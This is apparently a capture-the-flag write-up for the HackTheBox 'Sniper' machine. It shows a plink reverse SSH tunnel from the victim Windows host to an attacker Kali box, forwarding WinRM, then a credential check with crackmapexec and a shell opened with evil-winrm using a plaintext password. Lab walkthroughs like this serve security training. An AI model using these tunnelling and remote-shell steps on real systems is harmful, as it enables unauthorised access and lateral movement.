# Remote port-forwarding winRM back to Kali

I downloaded the latest plink for [64-bit here](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html).

```text
PS C:\Temp> .\plink64.exe -P 22022 -l root -pw <pw> -R 5985:127.0.0.1:5985 10.10.14.78
.\plink64.exe -P 22022 -l root -pw <pw> -R 5985:127.0.0.1:5985 10.10.14.78
The server's host key is not cached in the registry. You
have no guarantee that the server is the computer you
think it is.
The server's ssh-ed25519 key fingerprint is:
ssh-ed25519 255 6e:8b:15:36:77:7e:5e:c0:b2:25:8f:b5:74:68:32:df
If you trust this host, enter "y" to add the key to
PuTTY's cache and carry on connecting.
If you want to carry on connecting just once, without
adding the key to the cache, enter "n".
If you do not trust this host, press Return to abandon the
connection.
Store key in cache? (y/n) y
Using username "root".
Linux kali 5.3.0-kali2-amd64 #1 SMP Debian 5.3.9-3kali1 (2019-11-20) x86_64

The programs included with the Kali GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Feb 19 17:31:36 2021 from 192.168.92.1
root@kali:~#
```

Then we can check quickly if winRM login is possible

```text
root@kali:~/CTF/HTB/Sniper# netstat -ant | grep 5985
tcp        0      0 127.0.0.1:5985          0.0.0.0:*               LISTEN
tcp6       0      0 ::1:5985                :::*                    LISTEN
root@kali:~/CTF/HTB/Sniper# crackmapexec winrm 127.0.0.1 -u Chris -p '36mEAhz/B8xQ~2VM'
WINRM       127.0.0.1       5985   INDISHELL-LAB    [*] Windows 6.1 Build 0 (name:INDISHELL-LAB) (domain:)
WINRM       127.0.0.1       5985   INDISHELL-LAB    [*] http://127.0.0.1:5985/wsman
WINRM       127.0.0.1       5985   INDISHELL-LAB    [+] \Chris:36mEAhz/B8xQ~2VM (Pwn3d!)
```

Then do a login

```text
root@kali:~/CTF/HTB/Sniper# evil-winrm -i 127.0.0.1 -u Chris -p '36mEAhz/B8xQ~2VM'

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Chris\Documents> whoami
sniper\chris
```

